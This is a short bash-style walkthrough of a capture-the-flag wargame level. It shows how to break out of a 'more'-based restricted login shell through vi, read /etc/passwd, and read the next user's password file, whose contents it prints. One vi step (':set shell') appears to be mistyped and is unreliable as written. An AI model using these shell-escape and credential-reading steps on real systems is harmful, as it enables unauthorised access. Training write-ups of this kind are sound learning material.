#!/bin/bash

# Level 25 -> 26 Prompt

: << 'END'
Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
END

cat /etc/passwd | grep bandit26
# '/etc/passwd' contains user information

# bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext


# each line in the /etc/passwd file represents one user account and is structured as follows:

# username:password:UID:GID:full name:home directory:login shell


cat /usr/bin/showtext

: << 'END'
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0

END


# make the terminal window really small, then run `ssh -i bandit26.sshkey bandit26@localhost` - this should jam bandit26's startup shell script because the `more` command wouldn't be able to page its content properly.

# Tip: type `!<command>` to run `<command>` in a subshell

v
# this allows us to open the startup shell in Vi editor, where we can temper with the script

:set shell=/bin/bash

# then run it:
:set shell

cat /etc/bandit_pass/bandit26
# c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
